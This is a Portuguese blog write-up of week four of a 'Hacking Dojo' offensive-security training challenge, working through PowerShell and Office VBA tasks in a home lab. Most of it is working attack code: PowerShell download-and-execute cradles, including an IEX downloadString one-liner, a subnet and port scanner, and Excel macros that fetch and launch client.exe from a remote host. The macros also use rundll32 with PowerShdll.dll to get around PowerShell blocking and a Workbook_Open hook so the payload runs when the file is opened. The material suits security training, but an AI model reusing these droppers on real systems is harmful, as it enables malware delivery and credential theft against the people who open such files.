<p>Dando continuidade no desafio do <a href="https://becodoexploit.com/HackingDojo/">Hacking Dojo</a>, hoje atacaremos a semana 04.</p>

<p>Esta semana vamos atacar diretamente as linguagens mais utilizadas no <code class="language-plaintext highlighter-rouge">Windows</code>. Utilizando de <code class="language-plaintext highlighter-rouge">PowerShell</code> e as <code class="language-plaintext highlighter-rouge">Macros</code> do Office.</p>

<p>Bora pra cima!!</p>

<h2 id="task-x1a">Task \x1a</h2>

<center><img src="/img/std/dojo/dojo-61.png" /></center>

<p>O PowerShell possui nativamente uma variedade de comandos e funções que podem auxiliar na facilidade de se trabalhar com linha de comando. Basicamente uma evolução do <code class="language-plaintext highlighter-rouge">CMD</code> (ou um cmd metido a besta!).</p>

<p>Algumas destas funções auxiliam exatamente no download e execução de executáveis. Sáo elas:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">(New-Object System.Net.WebClient).DownloadFile()</code> que nos permite fazer uma requisição web direto para um executável e baixá-lo</li>
  <li><code class="language-plaintext highlighter-rouge">Start-Process ()</code> que nos permite executar um programa local</li>
</ul>

<p>Se juntarmos os dois comandos, podemos facilmente cumprir o que esta task nos pede. O código ficou bem simples:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$Arquivo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"client.exe"</span><span class="w">
</span><span class="nv">$End</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"http://192.168.1.7/</span><span class="nv">$Arquivo</span><span class="s2">"</span><span class="w">

</span><span class="n">Clear-Host</span><span class="w">

</span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="nv">$End</span><span class="p">,</span><span class="s2">"C:\Windows\Temp\</span><span class="nv">$Arquivo</span><span class="s2">"</span><span class="p">)</span><span class="w">
</span><span class="nx">Start-Process</span><span class="w"> </span><span class="p">(</span><span class="s2">"C:\Windows\Temp\</span><span class="nv">$Arquivo</span><span class="s2">"</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<p>Vamos iniciar nosso <code class="language-plaintext highlighter-rouge">handler</code> e o <code class="language-plaintext highlighter-rouge">HTTP Server</code>:</p>

<center><img src="/img/std/dojo/dojo-62.png" /></center>

<p>Com tudo pronto, só precisamos executar o script na VM Windows.</p>

<center><img src="/img/std/dojo/dojo-63.png" /></center>

<p>Logo após a execução, já podemos ver a requisição no HTTP Server e a conexão fita no handler, ao analisar os arquivos, temos o log com as credenciais salvas.</p>

<p>Este script, encerra esta task.</p>

<h2 id="task-x1b">Task \x1b</h2>

<center><img src="/img/std/dojo/dojo-64.png" /></center>

<p>De acordo com a <code class="language-plaintext highlighter-rouge">minha</code> interpretação desta task, precisamos fazer parecido com o que foi pedido na semana anterior. precisamos de um script que faça a varredura de todos os hosts <code class="language-plaintext highlighter-rouge">ativos</code> na rede local, e em seguida escanear todas as portas e informar quais estão abertas.</p>

<p>O script também não é complexo, abaixo como ficou, seguido da explicação passo-a-passo:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="n">ipconfig</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="p">[</span><span class="mi">0</span><span class="nt">-9</span><span class="p">]</span><span class="o">.</span><span class="nx">\.</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="nf">Split</span><span class="p">()[</span><span class="nt">-1</span><span class="p">]</span><span class="o">.</span><span class="nf">substring</span><span class="p">(</span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nx">9</span><span class="p">)</span><span class="w">

</span><span class="nx">For</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="nv">$i</span><span class="w"> </span><span class="o">-le</span><span class="w"> </span><span class="mi">255</span><span class="p">;</span><span class="w"> </span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span><span class="w">
    </span><span class="n">echo</span><span class="w"> </span><span class="s2">"</span><span class="se">`n</span><span class="s2">"</span><span class="w">
    </span><span class="nv">$hst</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$ip</span><span class="s2">.</span><span class="nv">$i</span><span class="s2">"</span><span class="w">
    </span><span class="nv">$test</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Test-Connection</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nv">$hst</span><span class="w"> </span><span class="nt">-Count</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nt">-Quiet</span><span class="w">
    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nv">$test</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="n">echo</span><span class="w"> </span><span class="s2">"[-] </span><span class="nv">$hst</span><span class="s2">"</span><span class="w">
        </span><span class="mi">1</span><span class="o">..</span><span class="mi">65355</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="p">{</span><span class="n">echo</span><span class="w"> </span><span class="p">((</span><span class="n">new-object</span><span class="w"> </span><span class="nx">Net.Sockets.TcpClient</span><span class="p">)</span><span class="o">.</span><span class="nf">Connect</span><span class="p">(</span><span class="nv">$hst</span><span class="p">,</span><span class="bp">$_</span><span class="p">))</span><span class="w"> </span><span class="s2">"Porta </span><span class="bp">$_</span><span class="s2"> --- ABERTA"</span><span class="p">}</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="bp">$null</span><span class="w">
    </span><span class="p">}</span><span class="w">
    
 </span><span class="p">}</span><span class="w"> 
</span></code></pre></div></div>

<p>Na primeira linha <code class="language-plaintext highlighter-rouge">$ip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1].substring(0, 9)</code> salvamos na variável <code class="language-plaintext highlighter-rouge">$ip</code> o resultado do comando <code class="language-plaintext highlighter-rouge">ipconfig</code> seguido de um tratamento feito em <code class="language-plaintext highlighter-rouge">regex</code>. Este tratamento vai pegar os <code class="language-plaintext highlighter-rouge">nove</code> primeiros dígitos numéricos e salvar na variável. Exemplo: num IP <code class="language-plaintext highlighter-rouge">192.168.1.160</code> ele vai salvar <code class="language-plaintext highlighter-rouge">192.168.1</code>, ou seja, sem a subrede do IP.</p>

<p>Nas linhas:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">For</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="nv">$i</span><span class="w"> </span><span class="o">-le</span><span class="w"> </span><span class="mi">255</span><span class="p">;</span><span class="w"> </span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span><span class="w">
    </span><span class="n">echo</span><span class="w"> </span><span class="s2">"</span><span class="se">`n</span><span class="s2">"</span><span class="w">
    </span><span class="nv">$hst</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$ip</span><span class="s2">.</span><span class="nv">$i</span><span class="s2">"</span><span class="w">
</span></code></pre></div></div>

<p>O script faz um loop de 255 voltas (quantidade de IPs na ,áscara de subrede /24) e pra cada volta do loop, adiciona a variável da contagem, ou seja, o IP que antes era <code class="language-plaintext highlighter-rouge">192.168.1</code> passa a ser <code class="language-plaintext highlighter-rouge">192.168.1.1</code> na primeira volta, <code class="language-plaintext highlighter-rouge">192.168.1.2</code> na segunda e assim por diante fazendo com que todos os IPs possíveis sejam gerados durante o loop.</p>

<p>Na linha <code class="language-plaintext highlighter-rouge">$test = Test-Connection -ComputerName $hst -Count 1 -Quiet</code> temos uma sequência de argumentos para a função <code class="language-plaintext highlighter-rouge">Test-Connection -ComputerName</code>. Esta função testa a conexão de um host repetidas vezes no terminal, para que não fique repetindo os testes, utilizamos o argumento <code class="language-plaintext highlighter-rouge">-Count 1</code> para que seja feita somente uma tentativa. Por fim, utilizamos o argumento <code class="language-plaintext highlighter-rouge">-Quiet</code>, para que o resultado deste teste seja um <code class="language-plaintext highlighter-rouge">booleano</code>, ou seja <code class="language-plaintext highlighter-rouge">True</code> se o IP estiver ativo e <code class="language-plaintext highlighter-rouge">False</code> se o IP estiver inativo/</p>

<p>Nas linhas:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nv">$test</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="n">echo</span><span class="w"> </span><span class="s2">"[-] </span><span class="nv">$hst</span><span class="s2">"</span><span class="w">
        </span><span class="mi">1</span><span class="o">..</span><span class="mi">65355</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="p">{</span><span class="n">echo</span><span class="w"> </span><span class="p">((</span><span class="n">new-object</span><span class="w"> </span><span class="nx">Net.Sockets.TcpClient</span><span class="p">)</span><span class="o">.</span><span class="nf">Connect</span><span class="p">(</span><span class="nv">$hst</span><span class="p">,</span><span class="bp">$_</span><span class="p">))</span><span class="w"> </span><span class="s2">"Porta </span><span class="bp">$_</span><span class="s2"> --- ABERTA"</span><span class="p">}</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="bp">$null</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span></code></pre></div></div>
<p>Verificamos a resposta da função anterior, se o resultado for <code class="language-plaintext highlighter-rouge">True</code>, então inicia-se mais um loop que vai de 1 a 65355, que a quantidade de portas possíveis em uma máquina, para cada uma que estiver ativa, ele retora a frase <code class="language-plaintext highlighter-rouge">Porta x --- ABERTA</code>.</p>

<p>Este script não tem uma performance muito boa, porém atende ao que foi solicitado e pode ser de muita ajuda em uma situação real.</p>

<p>Ao executarmos o script, temos a sequinte resposta:</p>

<center><img src="/img/std/dojo/dojo-65.png" /></center>

<p>Este script, encerra esta task.</p>

<h2 id="tasks-x1c-e-x1d">Tasks \x1c e \x1d</h2>

<center><img src="/img/std/dojo/dojo-66.png" /></center>

<p>Bom, esta task automaticamente já está sendo feita, pois todo o trabalho já está sendo publicado em uma <code class="language-plaintext highlighter-rouge">GitPage</code>, porém deixo o link para leitura da melhor fonte possível para aprender git, sua <a href="https://docs.github.com/pt">documentação</a>.</p>

<h2 id="task-x1e">Task \x1e</h2>

<center><img src="/img/std/dojo/dojo-67.png" /></center>

<p>Seguindo com as funções úteis do <code class="language-plaintext highlighter-rouge">PowerShell</code> que podemos utilizar, temos a <code class="language-plaintext highlighter-rouge">IEX</code> ou <em>Invoke-Expression</em>, basicamente este comando faz com que uma string seja executada como um comando, ou seja, se fizermos uma requisição para o script <code class="language-plaintext highlighter-rouge">raw</code> no GitHub e esta requisição for feita como string, ele executará o conteúdo de resposta.</p>

<p>O comando fica bem simples:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">IEX</span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadString</span><span class="p">(</span><span class="s1">'https://raw.githubusercontent.com/h41stur/dojo/main/semana_04/27_port_sccanner.ps1'</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<p>Ao executá-lo, temos a resposta do portscan iniciado:</p>

<center><img src="/img/std/dojo/dojo-68.png" /></center>

<p>Isso encerra esta task.</p>

<h2 id="task-x1f">Task \x1f</h2>

<center><img src="/img/std/dojo/dojo-69.png" /></center>

<p>Agora vamos começar a trabalhar com o <code class="language-plaintext highlighter-rouge">MS Office</code>, o que se torna um pouco mais complexo numa epoca de <code class="language-plaintext highlighter-rouge">365</code>. Porém, tenho uma licença que utilizo algumas vezes para trabalho, e será o suficiente para explorar as tasks do Dojo.</p>

<p>Esta task não tem segredo, precisamos habilitar as opções de desenvolvedor no <code class="language-plaintext highlighter-rouge">excel</code>. Para ativá-lo, precisamos clicar em <code class="language-plaintext highlighter-rouge">Arquivos &gt; Opções</code>:</p>

<center><img src="/img/std/dojo/dojo-70.png" /></center>

<p>Em seguida clicar em <code class="language-plaintext highlighter-rouge">Personalizar Faixa de Opções</code> e finalmente habilitar a aba <code class="language-plaintext highlighter-rouge">Desenvolvedor</code>:</p>

<center><img src="/img/std/dojo/dojo-71.png" /></center>

<p>No final, a aba de Desenvolvedor estará habilitada no menu de ferramentas:</p>

<center><img src="/img/std/dojo/dojo-72.png" /></center>

<h2 id="task-x20">Task \x20</h2>

<center><img src="/img/std/dojo/dojo-73.png" /></center>

<p>Agora iniciaremos na exploração de códigos em <code class="language-plaintext highlighter-rouge">VBA</code>. Já faz alguns anos que não utilizo macros do Office, portanto precisei relembrar várias coisas além de aprender coisas novas.</p>

<p>Esta task é muito simples, basicamente um aquecimento para o que está por vir, precisamos programar uma <code class="language-plaintext highlighter-rouge">macro</code> para imprimir uma mensagem na tela. O código é bem simples:</p>

<div class="language-visualbasic highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Sub</span> <span class="nf">Dojo</span><span class="p">()</span>
<span class="n">MsgBox</span> <span class="s">"Hacking Dojo"</span>
<span class="k">End</span> <span class="k">Sub</span>
</code></pre></div></div>

<p>Onde <code class="language-plaintext highlighter-rouge">Sub Dojo()</code> define o nome da macro e <code class="language-plaintext highlighter-rouge">MsgBox</code> abre o pop-up com a mensagem. Ao clicarmos em <code class="language-plaintext highlighter-rouge">Macros</code> na aba <code class="language-plaintext highlighter-rouge">Desenvolvedor</code>, podemos ver a macro criada.</p>

<center><img src="/img/std/dojo/dojo-74.png" /></center>

<p>Ao executá-la, temos a mensagem impressa na tela:</p>

<center><img src="/img/std/dojo/dojo-75.png" /></center>

<p>Isto encerra esta task.</p>

<h2 id="task-x21">Task \x21</h2>

<center><img src="/img/std/dojo/dojo-76.png" /></center>

<p>Agora as coisas começam a ficar interessantes, o VBA no Office possui uma função chamada <code class="language-plaintext highlighter-rouge">Shell()</code> onde podemos executar certos comandos e chamar certos executáveis.</p>

<p>Podemos invocar esta função chamando o <code class="language-plaintext highlighter-rouge">cmd.exe</code> que por sua vez vai chamar o <code class="language-plaintext highlighter-rouge">PowerShell</code> executando o comando. Esta função recebe dois parâmetros, o comando propriamente dito e o formato de saída. Os formatos de saída podem ser vistos na <a href="https://docs.microsoft.com/pt-br/office/vba/language/reference/user-interface-help/shell-function">documentação</a> da Microsoft.</p>

<p>A função ficou desta forma:</p>

<div class="language-visualbasic highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Sub</span> <span class="nf">PS</span><span class="p">()</span>
<span class="n">pid</span> <span class="o">=</span> <span class="n">Shell</span><span class="p">(</span><span class="s">"cmd.exe /k PowerShell -c whoami"</span><span class="p">,</span> <span class="n">vbNormalFocus</span><span class="p">)</span>
<span class="k">End</span> <span class="k">Sub</span>
</code></pre></div></div>

<p>Ao executá-la, temos a resposta:</p>

<center><img src="/img/std/dojo/dojo-77.png" /></center>

<p>Isto encerra esta task.</p>

<h2 id="task-x22">Task \x22</h2>

<center><img src="/img/std/dojo/dojo-78.png" /></center>

<p>Esta task também não tem segredo, uma vez que conseguimos executar comandos no <code class="language-plaintext highlighter-rouge">cmd</code> e já fizemos um script em <code class="language-plaintext highlighter-rouge">PowerShell</code> anteriormente para realizar a mesma função, só precisamos juntar os dois.</p>

<div class="language-visualbasic highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Sub</span> <span class="nf">Download_exec</span><span class="p">()</span>
<span class="n">pid</span> <span class="o">=</span> <span class="n">Shell</span><span class="p">(</span><span class="s">"cmd.exe /c PowerShell -c (New-Object System.Net.WebClient).DownloadFile('https://github.com/h41stur/dojo/blob/main/semana_04/client.exe?raw=true','C:\Windows\Temp\client.exe')"</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">pid2</span> <span class="o">=</span> <span class="n">Shell</span><span class="p">(</span><span class="s">"cmd.exe /c PowerShell -c Start-Process ('C:\Windows\Temp\client.exe')"</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="k">End</span> <span class="k">Sub</span>
</code></pre></div></div>

<p>Ao executar a macro, temos uma rápida abertura de duas telas do cmd (que também podem ser programadas para rodar em bacvkground).</p>

<center><img src="/img/std/dojo/dojo-79.png" /></center>

<p>Ao checarmos o diretório temporário do Windows, podemos ver que o arquivo boi baixado.</p>

<center><img src="/img/std/dojo/dojo-80.png" /></center>

<p>No Kali, temos a requisic”ao feita pelo programa normalmente encerrando a task.</p>

<h2 id="task-x23">Task \x23</h2>

<center><img src="/img/std/dojo/dojo-81.png" /></center>

<p>Esta task deixa as coisas muito interessantes a partir do momento que utilizaremos o <code class="language-plaintext highlighter-rouge">rundll32.exe</code> que nos permite rodar um programa através de uma <code class="language-plaintext highlighter-rouge">DLL</code>.</p>

<p>Em resumo, uma <code class="language-plaintext highlighter-rouge">DLL</code> (Dynamic Link Library) são bibliotecas que contém instruções para outros programas, de forma grosseira, equivalente aos arquivos <code class="language-plaintext highlighter-rouge">.so</code> no Linux. Estes arquivos não necessariamente precisam ter a extensão <code class="language-plaintext highlighter-rouge">.dll</code>, também podem ter as extensões <code class="language-plaintext highlighter-rouge">.ocx</code> (ActiveX Controls), <code class="language-plaintext highlighter-rouge">.cpl</code> (Control Panel) e <code class="language-plaintext highlighter-rouge">.drv</code> (Device Drivers).</p>

<p>Acontece que, diferente dos arquivos <code class="language-plaintext highlighter-rouge">.exe</code>, uma DLL não é executável diretamente, porém o <code class="language-plaintext highlighter-rouge">rundll32.exe</code> pode fazer este papel chamando diretamente uma DLL. Mas onde isso pode ser uma vantagem?</p>

<p>Vamos supor que agum software de proteção esteja bloqueando a execução do <code class="language-plaintext highlighter-rouge">PowerShell.exe</code>, neste caso, não será possível executar o PS, porém e se o rodarmos diretamente por uma DLL?</p>

<p>Aí entra o <code class="language-plaintext highlighter-rouge">runndll32</code>, que nos auxilia nesta tarefa (o que também não é 100% de garantia, mas pode fazer o <code class="language-plaintext highlighter-rouge">bypass</code> de certas proteções).</p>

<p>Na versão do Windows que estou utilizando no Lab <code class="language-plaintext highlighter-rouge">Windows 10 21H1</code>, não existe a DLL <code class="language-plaintext highlighter-rouge">PowerShdll.dll</code>, porém, com uma simples pesquisa, foi possível encontrá-lo <a href="https://github.com/p3nt4/PowerShdll">neste</a> GitHub. Ao adicioná-lo no diretório <code class="language-plaintext highlighter-rouge">C:\Windows\System32</code>, é possível chamá-lo através do rundll32 com o comando <code class="language-plaintext highlighter-rouge">rundll32 PowerShdll.dll,main</code> conforme abaixo.</p>

<center><img src="/img/std/dojo/dojo-82.png" /></center>

<p>Logo, o que precisamos fazer em nossa <code class="language-plaintext highlighter-rouge">Macro</code> é utilizar exatamente este comando seguido do script, a macro ficou desta forma:</p>

<div class="language-visualbasic highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Sub</span> <span class="nf">Download_exec</span><span class="p">()</span>
<span class="n">pid</span> <span class="o">=</span> <span class="n">Shell</span><span class="p">(</span><span class="s">"rundll32.exe PowerShdll.dll,main (New-Object System.Net.WebClient).DownloadFile('https://github.com/h41stur/dojo/blob/main/semana_04/client.exe?raw=true','C:\Windows\Temp\client.exe')"</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">pid2</span> <span class="o">=</span> <span class="n">Shell</span><span class="p">(</span><span class="s">"rundll32.exe PowerShdll.dll,main  Start-Process ('C:\Windows\Temp\client.exe')"</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="k">End</span> <span class="k">Sub</span>
</code></pre></div></div>
<p>Ao executar a macro, temos novamente a execução do PowerShell e o Download seguido da execução do programa.</p>

<center><img src="/img/std/dojo/dojo-83.png" /></center>

<h2 id="task-x24">Task \x24</h2>

<center><img src="/img/std/dojo/dojo-84.png" /></center>

<p>Com a macro feita, precisamos fazer com que ela execute automaticamente ao arquivo ser aberto, isto é ralativamente simples, só precisamos mudar a macro de lugar no VBA e alterar seu nome para um nome específico de sistema.</p>

<p>Primeiramente vamos retirá-la de <code class="language-plaintext highlighter-rouge">Módulos</code> dentro do editor do VBA e inseríla em <code class="language-plaintext highlighter-rouge">EstaPastaDeTrabalho</code>.</p>

<center><img src="/img/std/dojo/dojo-85.png" /></center>

<p>Após isto, precisamos alterar o nome da macro para <code class="language-plaintext highlighter-rouge">Private Sub Workbook_Open()</code>, o <code class="language-plaintext highlighter-rouge">Workbook_Open()</code> é um nome específico que indica que a macro será executada ao abrir o arquivo. A macro ficou desta forma:</p>

<div class="language-visualbasic highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Private</span> <span class="k">Sub</span> <span class="nf">Workbook_Open</span><span class="p">()</span>
<span class="n">pid</span> <span class="o">=</span> <span class="n">Shell</span><span class="p">(</span><span class="s">"rundll32.exe PowerShdll.dll,main (New-Object System.Net.WebClient).DownloadFile('https://github.com/h41stur/dojo/blob/main/semana_04/client.exe?raw=true','C:\Windows\Temp\client.exe')"</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">pid2</span> <span class="o">=</span> <span class="n">Shell</span><span class="p">(</span><span class="s">"rundll32.exe PowerShdll.dll,main  Start-Process ('C:\Windows\Temp\client.exe')"</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="k">End</span> <span class="k">Sub</span>
</code></pre></div></div>
<p>Isto encerra esta task.</p>

<h2 id="nota">Nota</h2>

<blockquote>
  <p>Todas as tasks envolvendo macros, só foram executadas com o Windows Defender <code class="language-plaintext highlighter-rouge">desativado</code>, pois como as macros são algo “manjado”, é muito fácil serem identificadas.</p>
</blockquote>

<p>Encerramos mais uma semana do Dojo!</p>

<p>Bons estudos.</p>

